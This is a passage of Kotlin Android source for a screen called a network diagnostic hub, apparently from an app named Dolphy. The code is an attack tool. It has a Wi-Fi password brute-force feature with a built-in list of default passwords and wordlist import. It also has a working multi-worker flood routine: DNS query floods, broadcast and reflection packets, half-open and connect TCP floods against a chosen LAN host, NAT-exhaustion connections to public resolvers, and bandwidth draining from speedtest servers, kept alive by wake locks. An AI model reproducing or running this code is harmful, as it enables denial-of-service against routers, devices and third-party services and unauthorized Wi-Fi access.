package com.droid.dolphy.network

import com.droid.dolphy.DolphyIconButton

import androidx.compose.animation.AnimatedContent
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.EnterTransition
import androidx.compose.animation.ExitTransition
import androidx.compose.animation.core.MutableTransitionState
import androidx.compose.animation.core.spring
import androidx.compose.animation.core.tween
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.scaleIn
import androidx.compose.animation.slideInVertically
import androidx.compose.animation.slideOutVertically
import androidx.compose.animation.togetherWith
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.SupplicantState
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSuggestion
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.navigationBarsPadding
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Build
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.ChevronRight
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.VpnKey
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material.icons.filled.FlashOn
import androidx.compose.material.icons.filled.SettingsEthernet
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.WifiOff
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.Checkbox
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.FilledTonalButton
import androidx.compose.ui.draw.clip
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.viewinterop.AndroidView
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import androidx.navigation.NavController
import com.droid.dolphy.M3SegmentedListItem
import com.droid.dolphy.M3SegmentedListItemSpacing
import com.droid.dolphy.MaterialBackground
import com.droid.dolphy.MaterialCard
import com.droid.dolphy.R
import com.droid.dolphy.SectionTopBar
import com.droid.dolphy.SignalRow
import com.droid.dolphy.TextGray
import com.droid.dolphy.m3SegmentedItems
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.FileReader
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.Socket
import java.net.InetSocketAddress
import java.net.URL
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.channels.SocketChannel
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import kotlinx.coroutines.yield

private data class HubWifiNetwork(
    val ssid: String,
    val bssid: String?,
    val level: Int,
    val frequencyMhz: Int,
    val capabilities: String?,
    val isActive: Boolean,
)

private enum class HubDialogStage {
    Menu,
    Countdown,
    WaitingConnection,
    Started,
    BruteForce,
    Error,
    AdminPanel,
    SelectDevice,
}

private data class HubLanHost(
    val ip: String,
    val title: String,
    val subtitle: String = "",
    val isGateway: Boolean = false,
    val isSelf: Boolean = false,
)

private const val STOCK_GROUP_NAME = "Kata sandi bawaan"

@Serializable
private data class PasswordGroupDto(
    val name: String,
    val passwords: List<String>,
    val selected: Boolean,
    val sourceFile: String? = null,
    val count: Int = 0,
    val validCount: Int = 0,
)

private abstract class PasswordCursor {
    abstract fun nextPassword(): String?
    open fun close() = Unit
}

private class ListPasswordCursor(values: List<String>) : PasswordCursor() {
    private val iterator = values.iterator()
    override fun nextPassword(): String? = if (iterator.hasNext()) iterator.next() else null
}

private class FilePasswordCursor(private val reader: BufferedReader) : PasswordCursor() {
    override fun nextPassword(): String? {
        while (true) {
            val line = reader.readLine() ?: return null
            normalizeWordlistLine(line)?.let { return it }
        }
    }

    override fun close() = reader.close()
}

private class PasswordGroup(
    val name: String,
    val sourceFile: String? = null,
    private val fileCount: Int = 0,
    private val fileValidCount: Int = 0,
) {
    var selected by mutableStateOf(true)
    val passwords = mutableListOf<String>()
    val isImported: Boolean get() = sourceFile != null || name != STOCK_GROUP_NAME
    val count: Int get() = if (sourceFile == null) passwords.size else fileCount
    val validCount: Int get() = if (sourceFile == null) passwords.count(::isSupportedWpaPassphrase) else fileValidCount

    fun openCursor(context: android.content.Context): PasswordCursor {
        return if (sourceFile == null) ListPasswordCursor(passwords)
        else FilePasswordCursor(WordlistStore.openReader(context, sourceFile))
    }
}

@Composable
fun NetworkDiagnosticHubScreen(navController: NavController) {
    val context = LocalContext.current
    val haptics = LocalHapticFeedback.current
    val lifecycleOwner = LocalLifecycleOwner.current
    val wifiManager = remember {
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    }
    val connectivityManager = remember {
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    }
    val scope = rememberCoroutineScope()

    fun requiredWifiPermissions(): Array<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.NEARBY_WIFI_DEVICES,
                Manifest.permission.CHANGE_WIFI_STATE
            )
        } else {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CHANGE_WIFI_STATE
            )
        }
    }

    fun hasWifiPermissions(): Boolean {
        return requiredWifiPermissions().all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    var wifiPermissionsGranted by remember { mutableStateOf(hasWifiPermissions()) }
    val locationManager = remember {
        context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    }

    fun isLocationServicesEnabled(): Boolean {
        val lm = locationManager ?: return false
        return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }

    var locationServicesEnabled by remember { mutableStateOf(isLocationServicesEnabled()) }
    var showLocationServicesDialog by remember { mutableStateOf(false) }
    val wifiPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        wifiPermissionsGranted = hasWifiPermissions()
        locationServicesEnabled = isLocationServicesEnabled()
    }


    LaunchedEffect(Unit) {
        if (!hasWifiPermissions()) {
            wifiPermissionLauncher.launch(requiredWifiPermissions())
        } else if (!locationServicesEnabled) {
            showLocationServicesDialog = true
        }
    }

    val networks = remember { mutableStateListOf<HubWifiNetwork>() }
    var dialogNetwork by remember { mutableStateOf<HubWifiNetwork?>(null) }
    var dialogStage by remember { mutableStateOf<HubDialogStage?>(null) }
    var countdown by remember { mutableIntStateOf(3) }
    var launchedWifiSettings by remember { mutableStateOf(false) }
    var udpSendJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
    var bruteForceJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
    val wifiBruteMutex = remember { Mutex() }
    val sendLogs = remember { mutableStateListOf<String>() }

    var bruteForceSuccess by remember { mutableStateOf(false) }
    var bruteForceNeedsUserAction by remember { mutableStateOf(false) }
    var foundPassword by remember { mutableStateOf("") }

    var currentBrutePassword by remember { mutableStateOf("") }
    var showPasswordDialog by remember { mutableStateOf(false) }
    val lanHosts = remember { mutableStateListOf<HubLanHost>() }
    var lanScanning by remember { mutableStateOf(false) }
    var lanScanJob by remember { mutableStateOf<Job?>(null) }
    var selectedTargetLabel by remember { mutableStateOf("") }

    val prefs = remember { context.getSharedPreferences("wifi_passwords", Context.MODE_PRIVATE) }

    fun saveGroups(groups: List<PasswordGroup>) {
        val dtos = groups.map { group ->
            PasswordGroupDto(
                name = group.name,
                passwords = if (group.sourceFile == null) group.passwords.toList() else emptyList(),
                selected = group.selected,
                sourceFile = group.sourceFile,
                count = group.count,
                validCount = group.validCount,
            )
        }
        try {
            val json = Json.encodeToString(dtos)
            prefs.edit().putString("groups", json).apply()
        } catch (e: Exception) {
            android.util.Log.w("WordlistStore", "Failed to save groups", e)
        }
    }

    fun loadGroups(): List<PasswordGroup> {
        val json = prefs.getString("groups", null) ?: return emptyList()
        return try {
            val dtos = Json.decodeFromString<List<PasswordGroupDto>>(json)
            dtos.mapNotNull { dto ->
                val sourceFile = dto.sourceFile
                if (sourceFile != null) {
                    val fileExists = runCatching {
                        WordlistStore.exists(context, sourceFile)
                    }.getOrDefault(false)
                    if (!fileExists) return@mapNotNull null
                    PasswordGroup(
                        name = dto.name,
                        sourceFile = sourceFile,
                        fileCount = dto.count,
                        fileValidCount = dto.validCount,
                    ).apply { selected = dto.selected }
                } else {
                    PasswordGroup(dto.name).apply {
                        passwords.addAll(dto.passwords)
                        selected = dto.selected
                    }
                }
            }
        } catch (e: Exception) {
            emptyList()
        }
    }

    val defaultPasswords = listOf(
        "12345678", "YJFJTGM2", "11111111", "00000000", "22222222", "33333333", "44444444", "55555555",
        "66666666", "77777777", "88888888", "99999999", "qwertyui", "qwertzui", "qwertyuiop", "asdfghjk",
        "password", "adminadmin", "87654321", "12344321", "00001111", "12312312", "11223344", "1234567890",
        "netgear1", "linksys1", "dlink123", "tplink123", "admin123", "rootroot", "guest123",
        "qwerty123", "12345qwerty", "admin", "root", "12345", "123456", "1234567",
        "freewifi", "free_wifi", "freewifi123", "internet", "guestwifi", "publicwifi", "welcome",
        "welcome123", "login123", "wifi1234", "accesspoint", "hotspot123", "openwifi", "starbucks",
        "mcdonalds", "public_wifi", "internet123", "home_wifi", "my_wifi", "secure_wifi", "w12345678i", "12346789"
    ).distinct()

    val passwordGroups = remember {
        val loaded = loadGroups()
        if (loaded.isNotEmpty()) {
            mutableStateListOf<PasswordGroup>().apply { addAll(loaded) }
        } else {
            mutableStateListOf<PasswordGroup>().apply {
                add(PasswordGroup(STOCK_GROUP_NAME).apply {
                    passwords.addAll(defaultPasswords)
                })
            }
        }
    }

    fun appendLog(message: String) {
        val stamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        if (sendLogs.size >= 500) sendLogs.removeAt(0)
        sendLogs += "[$stamp] $message"
    }

    var importingWordlist by remember { mutableStateOf(false) }
    var deletingWordlist by remember { mutableStateOf(false) }
    var wordlistFeedback by remember { mutableStateOf<String?>(null) }
    var pendingWordlistDeletion by remember { mutableStateOf<PasswordGroup?>(null) }

    val fileImportLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.OpenDocument()
    ) { uri ->
        if (uri == null) return@rememberLauncherForActivityResult
        scope.launch {
            importingWordlist = true
            wordlistFeedback = "Mengimpor wordlist…"
            try {
                val imported = withContext(Dispatchers.IO) {
                    WordlistStore.import(context, uri)
                }
                val groupName = uniqueWordlistName(
                    imported.suggestedName,
                    passwordGroups.map { it.name },
                )
                passwordGroups.add(
                    PasswordGroup(
                        name = groupName,
                        sourceFile = imported.fileName,
                        fileCount = imported.count,
                        fileValidCount = imported.validCount,
                    )
                )
                saveGroups(passwordGroups)
                wordlistFeedback = "$groupName: ${imported.count} entri · ${imported.validCount} siap dicoba"
                appendLog("Wordlist imported: $groupName (${imported.count} entries)")
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                val message = e.message ?: e.javaClass.simpleName
                wordlistFeedback = "Impor gagal: $message"
                appendLog("Wordlist import error: $message")
            } finally {
                importingWordlist = false
            }
        }
    }

    fun getGatewayIpAddress(context: Context): String? {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val dhcpInfo = wifiManager.dhcpInfo
            dhcpIntToIpv4(dhcpInfo.gateway)
        } catch (e: Exception) {
            null
        }
    }

    
    fun getDhcpDnsServers(context: Context): List<String> {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val dhcp = wifiManager.dhcpInfo
            listOfNotNull(dhcpIntToIpv4(dhcp.dns1), dhcpIntToIpv4(dhcp.dns2)).distinct()
        } catch (_: Exception) {
            emptyList()
        }
    }

    fun currentSsid(): String? {
        val raw = runCatching { wifiManager.connectionInfo?.ssid }.getOrNull() ?: return null
        val normalized = raw.trim().trim('"')
        return normalized.takeIf { it.isNotBlank() && !it.equals("unknown ssid", ignoreCase = true) }
    }

    fun refreshNetworks() {
        if (!wifiPermissionsGranted || !locationServicesEnabled) {
            networks.clear()
            return
        }

        runCatching { wifiManager.startScan() }
        val activeSsid = currentSsid()
        val refreshed = runCatching { wifiManager.scanResults.orEmpty() }
            .getOrElse { emptyList() }
            .mapNotNull { scan ->
                val ssid = scan.SSID?.trim().orEmpty()
                if (ssid.isBlank()) null else HubWifiNetwork(
                    ssid = ssid,
                    bssid = scan.BSSID,
                    level = scan.level,
                    frequencyMhz = scan.frequency,
                    capabilities = scan.capabilities,
                    isActive = activeSsid == ssid,
                )
            }
            .distinctBy { it.ssid to it.bssid }
            .sortedWith(
                compareByDescending<HubWifiNetwork> { it.isActive }
                    .thenByDescending { it.level }
                    .thenBy { it.ssid.lowercase() }
            )

        networks.clear()
        networks.addAll(refreshed)
    }

    fun startContinuousUdpTest(targetSsid: String, targetIp: String? = null): Job {
        appendLog(context.getString(R.string.network_hub_log_connected, targetSsid))
        val gateway = getGatewayIpAddress(context)
        val dhcpDns = getDhcpDnsServers(context)
        val primaryIp = targetIp?.trim()?.takeIf { it.isNotBlank() }
            ?: gateway
            ?: "255.255.255.255"
        val isHostTarget = !targetIp.isNullOrBlank()
        val isRouterMode = !isHostTarget || primaryIp == gateway
        if (isHostTarget && !isRouterMode) {
            appendLog("Persiapan L3/L4 flood → $primaryIp")
            appendLog("Mode: perangkat + DNS/NAT router")
        } else {
            appendLog(context.getString(R.string.network_hub_log_prepare))
            appendLog("Mode: router — DNS resolver + NAT + kanal")
        }
        if (selectedTargetLabel.isNotBlank()) {
            appendLog("Target: $selectedTargetLabel")
        }
        if (dhcpDns.isNotEmpty()) {
            appendLog("DHCP DNS: ${dhcpDns.joinToString()}")
        }

        val wakeLock = runCatching {
            (context.getSystemService(Context.POWER_SERVICE) as PowerManager)
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Dolphy:netflood")
                .apply { acquire(30 * 60 * 1000L) }
        }.getOrNull()
        val wifiLock = runCatching {
            wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "Dolphy:netflood")
                .apply { acquire() }
        }.getOrNull()
        if (wakeLock != null || wifiLock != null) {
            appendLog("Menjaga radio: WakeLock/WifiLock aktif")
        }

        val job = scope.launch(Dispatchers.IO) {
            val packetCount = AtomicLong(0)
            val byteCount = AtomicLong(0)
            val primaryAddr = runCatching { InetAddress.getByName(primaryIp) }.getOrNull()
            if (primaryAddr == null) {
                withContext(Dispatchers.Main) {
                    appendLog("Gagal me-resolve $primaryIp")
                }
                return@launch
            }
            val gatewayAddr = gateway?.let { runCatching { InetAddress.getByName(it) }.getOrNull() }
            val broadcastAddr = runCatching { InetAddress.getByName("255.255.255.255") }.getOrNull()
            val ssdpAddr = runCatching { InetAddress.getByName("239.255.255.250") }.getOrNull()
            val mdnsAddr = runCatching { InetAddress.getByName("224.0.0.251") }.getOrNull()

            val dnsTargets = linkedSetOf<InetAddress>()
            gatewayAddr?.let { dnsTargets += it }
            dhcpDns.forEach { ip ->
                runCatching { InetAddress.getByName(ip) }.getOrNull()?.let { dnsTargets += it }
            }
            if (isHostTarget) dnsTargets += primaryAddr
            if (dnsTargets.isEmpty()) dnsTargets += primaryAddr
            val dnsList = dnsTargets.toList()

            val externalHosts = listOf(
                "1.1.1.1", "1.0.0.1", "8.8.8.8", "8.8.4.4",
                "9.9.9.9", "208.67.222.222", "208.67.220.220",
                "142.250.190.14",
                "13.107.21.200",
                "104.16.132.229",
                "23.192.228.80",
                "151.101.1.69",
            ).mapNotNull { runCatching { InetAddress.getByName(it) }.getOrNull() }
            val externalPorts = intArrayOf(53, 80, 443, 8080, 8443, 123, 853)

            val bandwidthUrls = listOf(
                "http://speedtest.tele2.net/10MB.zip",
                "http://speedtest.tele2.net/1MB.zip",
                "http://ipv4.download.thinkbroadband.com/5MB.zip",
                "http://ipv4.download.thinkbroadband.com/10MB.zip",
                "http://proof.ovh.net/files/1Mb.dat",
                "http://proof.ovh.net/files/10Mb.dat",
            )

            withContext(Dispatchers.Main) {
                appendLog(context.getString(R.string.network_hub_log_target, primaryIp))
                appendLog("DNS targets: ${dnsList.joinToString { it.hostAddress ?: "?" }}")
                if (isRouterMode) {
                    appendLog("NAT exhaust → ${externalHosts.size} WAN hosts · bandwidth streams")
                }
                appendLog("Half-open SYN × ${if (isRouterMode) 10 else 18} · SSDP/mDNS/SNMP refleksi")
            }

            val localUdpPorts = intArrayOf(53, 67, 68, 123, 1900, 5353, 161, 137, 138)
            val localTcpPorts = intArrayOf(53, 80, 443, 8080, 8443, 22, 23, 445, 8081, 8888)
            val httpPaths = listOf("/", "/generate_204", "/hotspot-detect.html", "/ncsi.txt", "/favicon.ico", "/cgi-bin/")
            val junk = ByteArray(1400) { (it * 31 + 7).toByte() }
            val dhcpDiscover = buildDhcpDiscover()

            val dnsWorkers = (1..32).map { workerId ->
                launch {
                    val random = java.util.Random(workerId.toLong() xor System.nanoTime())
                    val sockets = (1..3).map {
                        runCatching {
                            DatagramSocket().apply {
                                sendBufferSize = 512 * 1024
                                soTimeout = 1
                                reuseAddress = true
                                broadcast = true
                            }
                        }.getOrNull()
                    }.filterNotNull()
                    if (sockets.isEmpty()) return@launch
                    val templates = Array(8) { buildRandomRecursiveDnsQuery(random) }
                    try {
                        var i = 0
                        while (isActive) {
                            val q = templates[random.nextInt(templates.size)]
                            q[0] = random.nextInt(256).toByte()
                            q[1] = random.nextInt(256).toByte()
                            val dest = dnsList[random.nextInt(dnsList.size)]
                            runCatching {
                                sockets[i % sockets.size].send(DatagramPacket(q, q.size, dest, 53))
                                packetCount.incrementAndGet()
                                byteCount.addAndGet(q.size.toLong())
                            }
                            repeat(3) {
                                val q2 = templates[random.nextInt(templates.size)]
                                q2[0] = random.nextInt(256).toByte()
                                q2[1] = random.nextInt(256).toByte()
                                val d2 = dnsList[random.nextInt(dnsList.size)]
                                runCatching {
                                    sockets[(i + it) % sockets.size].send(DatagramPacket(q2, q2.size, d2, 53))
                                    packetCount.incrementAndGet()
                                    byteCount.addAndGet(q2.size.toLong())
                                }
                            }
                            if ((i and 31) == 0) {
                                runCatching {
                                    Socket().use { s ->
                                        s.tcpNoDelay = true
                                        s.soTimeout = 60
                                        s.connect(InetSocketAddress(dest, 53), 60)
                                        val len = ByteBuffer.allocate(2).order(ByteOrder.BIG_ENDIAN)
                                            .putShort(q.size.toShort()).array()
                                        val out = s.getOutputStream()
                                        out.write(len)
                                        out.write(q)
                                        out.flush()
                                    }
                                    packetCount.incrementAndGet()
                                }
                            }
                            i++
                            if ((i and 127) == 0) yield()
                        }
                    } finally {
                        sockets.forEach { runCatching { it.close() } }
                    }
                }
            }

            val udpServiceWorkers = (1..12).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 7000L)
                    val socket = runCatching {
                        DatagramSocket().apply {
                            broadcast = true
                            sendBufferSize = 256 * 1024
                            soTimeout = 1
                            reuseAddress = true
                        }
                    }.getOrNull() ?: return@launch
                    try {
                        var i = 0
                        while (isActive) {
                            val port = localUdpPorts[random.nextInt(localUdpPorts.size)]
                            val dest = when (port) {
                                67, 68 -> broadcastAddr ?: primaryAddr
                                1900 -> ssdpAddr ?: broadcastAddr ?: primaryAddr
                                5353 -> mdnsAddr ?: broadcastAddr ?: primaryAddr
                                else -> primaryAddr
                            }
                            val payload = when (port) {
                                67, 68 -> dhcpDiscover
                                53 -> buildRandomRecursiveDnsQuery(random)
                                1900 -> buildSsdpMsearch(if ((i and 1) == 0) "ssdp:all" else "upnp:rootdevice")
                                5353 -> buildMdnsServiceQuery(random.nextInt(0x10000))
                                161 -> buildSnmpGetNext(random.nextInt())
                                else -> junk
                            }
                            val len = if (port == 67 || port == 68) payload.size else minOf(payload.size, 512 + random.nextInt(800))
                            runCatching {
                                socket.send(DatagramPacket(payload, len, dest, port))
                                packetCount.incrementAndGet()
                                byteCount.addAndGet(len.toLong())
                            }
                            if (gatewayAddr != null && (i and 1) == 0) {
                                val q = buildRandomRecursiveDnsQuery(random)
                                runCatching {
                                    socket.send(DatagramPacket(q, q.size, gatewayAddr, 53))
                                    packetCount.incrementAndGet()
                                }
                            }
                            i++
                            if ((i and 127) == 0) yield()
                        }
                    } finally {
                        runCatching { socket.close() }
                    }
                }
            }

            val natWorkers = (1..if (isRouterMode) 28 else 12).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 9000L)
                    val held = ArrayDeque<Socket>(64)
                    try {
                        while (isActive) {
                            if (held.size > 48) {
                                runCatching { held.removeFirst().close() }
                                releaseFd()
                            }
                            val host = if (externalHosts.isNotEmpty()) {
                                externalHosts[random.nextInt(externalHosts.size)]
                            } else {
                                primaryAddr
                            }
                            val port = externalPorts[random.nextInt(externalPorts.size)]
                            runCatching {
                                val s = Socket()
                                s.tcpNoDelay = true
                                s.soTimeout = 120
                                s.connect(InetSocketAddress(host, port), 150)
                                val out = s.getOutputStream()
                                when (port) {
                                    80, 8080 -> {
                                        out.write(
                                            ("GET / HTTP/1.1\r\nHost: ${host.hostAddress}\r\n" +
                                                "Connection: keep-alive\r\n\r\n").toByteArray(),
                                        )
                                        out.flush()
                                        if (random.nextBoolean() && tryAcquireFd()) {
                                            held.addLast(s)
                                        } else {
                                            s.close()
                                        }
                                    }
                                    443, 8443, 853 -> {
                                        out.write(junk, 0, 200)
                                        out.flush()
                                        if (random.nextInt(3) == 0 && tryAcquireFd()) held.addLast(s) else s.close()
                                    }
                                    else -> {
                                        out.write(junk, 0, 64)
                                        out.flush()
                                        s.close()
                                    }
                                }
                                packetCount.incrementAndGet()
                            }
                        }
                    } finally {
                        held.forEach {
                            runCatching { it.close() }
                            releaseFd()
                        }
                        held.clear()
                    }
                }
            }

            val tcpConnectWorkers = (1..4).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 3000L)
                    while (isActive) {
                        val port = localTcpPorts[random.nextInt(localTcpPorts.size)]
                        runCatching {
                            Socket().use { socket ->
                                socket.tcpNoDelay = true
                                socket.soTimeout = 80
                                socket.connect(InetSocketAddress(primaryAddr, port), 100)
                                val out = socket.getOutputStream()
                                if (port == 80 || port == 8080 || port == 8008 || port == 8888) {
                                    val path = httpPaths[random.nextInt(httpPaths.size)]
                                    out.write(
                                        ("GET $path HTTP/1.1\r\nHost: $primaryIp\r\n" +
                                            "Connection: close\r\n\r\n").toByteArray(),
                                    )
                                } else if (port == 443 || port == 8443) {
                                    out.write(junk, 0, 200)
                                } else {
                                    out.write(junk, 0, 128)
                                }
                                out.flush()
                            }
                        }
                        packetCount.incrementAndGet()
                    }
                }
            }

            val halfOpenWorkers = (1..if (isRouterMode) 10 else 18).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 30000L)
                    val pending = HashMap<SocketChannel, Long>()
                    try {
                        while (isActive) {
                            val now = System.currentTimeMillis()
                            val it = pending.entries.iterator()
                            while (it.hasNext()) {
                                val (ch, deadline) = it.next()
                                val done = runCatching { ch.finishConnect() }.getOrDefault(false)
                                if (done || now >= deadline) {
                                    runCatching { ch.close() }
                                    releaseFd()
                                    it.remove()
                                }
                            }
                            if (pending.size < 64 && tryAcquireFd()) {
                                val port = localTcpPorts[random.nextInt(localTcpPorts.size)]
                                val ch = runCatching {
                                    SocketChannel.open().apply { configureBlocking(false) }
                                }.getOrNull()
                                if (ch != null && runCatching { ch.connect(InetSocketAddress(primaryAddr, port)) }.isSuccess) {
                                    pending[ch] = now + 5000
                                    packetCount.incrementAndGet()
                                } else {
                                    runCatching { ch?.close() }
                                    releaseFd()
                                }
                            } else if (pending.isEmpty()) {
                                delay(2)
                            }
                            if ((packetCount.get() and 511) == 0L) yield()
                        }
                    } finally {
                        pending.keys.forEach {
                            runCatching { it.close() }
                            releaseFd()
                        }
                        pending.clear()
                    }
                }
            }

            val bwWorkers = (1..if (isRouterMode) 8 else 3).map { workerId ->
                launch {
                    val random = java.util.Random(workerId + 11000L)
                    val buf = ByteArray(64 * 1024)
                    while (isActive) {
                        val urlStr = bandwidthUrls[random.nextInt(bandwidthUrls.size)]
                        runCatching {
                            val conn = (URL(urlStr).openConnection() as HttpURLConnection).apply {
                                connectTimeout = 2500
                                readTimeout = 4000
                                instanceFollowRedirects = true
                                useCaches = false
                                requestMethod = "GET"
                                setRequestProperty("User-Agent", "DolphyBW/$workerId")
                                setRequestProperty("Connection", "close")
                                setRequestProperty("Accept-Encoding", "identity")
                            }
                            try {
                                val code = conn.responseCode
                                if (code in 200..399) {
                                    conn.inputStream.use { input ->
                                        while (isActive) {
                                            val n = input.read(buf)
                                            if (n <= 0) break
                                            byteCount.addAndGet(n.toLong())
                                            packetCount.incrementAndGet()
                                        }
                                    }
                                }
                            } finally {
                                conn.disconnect()
                            }
                        }
                    }
                }
            }

            launch {
                var lastPkts = 0L
                var lastBytes = 0L
                var lastTs = System.currentTimeMillis()
                while (isActive) {
                    delay(500)
                    val now = System.currentTimeMillis()
                    val pkts = packetCount.get()
                    val bytes = byteCount.get()
                    val dt = (now - lastTs).coerceAtLeast(1)
                    val pps = ((pkts - lastPkts) * 1000L) / dt
                    val mbps = ((bytes - lastBytes) * 8.0 / dt / 1000.0)
                    lastPkts = pkts
                    lastBytes = bytes
                    lastTs = now
                    withContext(Dispatchers.Main) {
                        appendLog(
                            "flood: $pkts ops · ${pps}/s · ${"%.1f".format(Locale.US, mbps)} Mbps",
                        )
                    }
                }
            }

            (dnsWorkers + udpServiceWorkers + natWorkers + tcpConnectWorkers + halfOpenWorkers + bwWorkers)
                .forEach { it.join() }
        }
        job.invokeOnCompletion {
            runCatching { wakeLock?.takeIf { it.isHeld }?.release() }
            runCatching { wifiLock?.takeIf { it.isHeld }?.release() }
        }
        return job
    }

    fun startLanDeviceScan() {
        lanScanJob?.cancel()
        lanHosts.clear()
        lanScanning = true
        lanScanJob = scope.launch(Dispatchers.IO) {
            val hosts = linkedMapOf<String, HubLanHost>()
            val gateway = getGatewayIpAddress(context)
            val self = getHubLocalIpv4()

            if (gateway != null) {
                hosts[gateway] = HubLanHost(
                    ip = gateway,
                    title = "Gateway / router",
                    subtitle = "DNS · DHCP · internet",
                    isGateway = true,
                )
            }
            if (self != null) {
                hosts[self] = HubLanHost(
                    ip = self,
                    title = "Perangkat ini",
                    subtitle = "Anda",
                    isSelf = true,
                )
            }
            readArpTable().forEach { (ip, mac) ->
                if (!hosts.containsKey(ip)) {
                    hosts[ip] = HubLanHost(ip, ip, "MAC $mac")
                } else {
                    val old = hosts[ip]!!
                    if (old.subtitle.isBlank()) {
                        hosts[ip] = old.copy(subtitle = "MAC $mac")
                    }
                }
            }
            withContext(Dispatchers.Main) {
                lanHosts.clear()
                lanHosts.addAll(hosts.values.sortedWith(compareByDescending<HubLanHost> { it.isGateway }.thenBy { it.ip }))
            }

